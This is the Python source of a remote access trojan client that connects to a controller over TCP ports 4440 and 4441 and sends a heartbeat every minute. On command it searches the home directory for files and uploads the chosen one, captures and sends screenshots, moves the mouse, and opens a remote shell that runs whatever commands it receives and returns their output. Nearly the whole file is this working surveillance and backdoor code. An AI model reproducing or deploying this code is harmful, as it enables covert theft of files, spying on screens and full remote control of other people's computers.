import socket
import threading
import os
import glob
import pathlib
import pickle
import time
import pyautogui
import schedule
import subprocess


def find_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Connect the socket to a remote address (doesn't matter what address)
    s.connect(("8.8.8.8", 80))

    # Get the local IP address of the socket
    local_ip_address = s.getsockname()[0]

    # Close the socket
    s.close()

    print("Local IP address:", local_ip_address)
    return local_ip_address


def send_heartbeat():
    second_send("I'm up!")
    print("up")


t = None  # initialize t to None


def schedule_heartbeat():
    global t
    if t is not None:
        t.cancel()  # cancel the existing timer if it exists

    t = threading.Timer(60.0, schedule_heartbeat)  # create a new timer that repeats every 5 seconds

    t.start()

    send_heartbeat()
    return t
    # call the send_heartbeat function


header = 16384
server_ip = find_local_ip()
port = 4440
second_port = port + 1
disconnect_message = "!DISCONNECT"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

second_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
second_client.connect((server_ip, second_port))


def find_all(name, path):
    result = []
    print(glob.glob(f'{name}.*'))
    for f in path.rglob(f'{name}.*'):
        print(f)
        result.append(f)
    return result


def send(msg):
    message = msg.encode('utf-8')
    message_length = len(message)
    send_length = str(message_length).encode('utf-8')
    send_length += b' ' * (header - len(send_length))
    client.send(send_length)
    time.sleep(0.5)
    client.send(message)


def second_send(msg):
    message = msg.encode('utf-8')
    message_length = len(message)
    send_length = str(message_length).encode('utf-8')
    send_length += b' ' * (header - len(send_length))
    second_client.send(send_length)
    time.sleep(0.5)
    second_client.send(message)


t = schedule_heartbeat()


def start():
    while True:
        try:
            try:
                client.connect((server_ip, port))
            except:
                pass

            command = client.recv(header).decode('utf-8')
            if len(command) > 0:
                if command == "GIVE_FILES":
                    send("GIVE_NAME")
                    time.sleep(0.5)
                    keyword = client.recv(header).decode("utf-8")
                    data_list = find_all(keyword, pathlib.Path.home())
                    send(str(data_list))
                    send("MAKE_CHOICE")
                    number_in_list = client.recv(2048).decode('utf-8')
                    print(number_in_list)

                    file_name = str(data_list[int(number_in_list)])
                    send("FILE")

                    with open(file_name, 'rb') as f:  # open a text file
                        binary_data = f.read()
                        pickled_file = pickle.dumps(binary_data)
                    print("PICKLED")
                    print(type(pickled_file))
                    print(file_name.split(".")[1])

                    client.send(pickled_file)
                    time.sleep(1)
                    client.send("hello".encode("utf-8"))

                    print("sent")

                if command == "SCREENSHOT":
                    s = pyautogui.screenshot()
                    print(type(s))
                    serialized_screen = pickle.dumps(s)

                    send("SCREENSHOT")
                    time.sleep(1)
                    client.send(str(len(pickle.dumps(s))).encode('utf-8'))
                    time.sleep(1)
                    client.send(serialized_screen)
                    time.sleep(1)
                    print(client.recv(header))

                if command == "MOVE_MOUSE":
                    send("MOVE_MOUSE")
                    x_coordinates = int(client.recv(header).decode("utf-8"))
                    y_coordinates = int(client.recv(header).decode("utf-8"))

                    print(x_coordinates, y_coordinates)
                    pyautogui.moveTo(x_coordinates, y_coordinates, duration=2)
                    print("done")

                if command == "SHELL":
                    send("SHELL")
                    while True:
                        command = client.recv(1024)
                        print(command)
                        if command == b'exit':
                            break
                        else:

                            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                    stdin=subprocess.PIPE)

                            output = proc.stdout.read() + proc.stderr.read()
                            print(output)
                            if output == b'':
                                client.send("NO OUTPUT".encode("utf-8"))
                            else:
                                client.send(output)

                if command == "DISCONNECT":
                    send(disconnect_message)
                    t.cancel()
                    second_send(disconnect_message)
                    break
        except Exception as e:
            print("try again...")
            print(e)
            time.sleep(3)
            continue


if __name__ == "__main__":
    thread1 = threading.Thread(target=start)
    thread1.start()
    if not thread1.is_alive():
        print("trying")
        thread1.start()
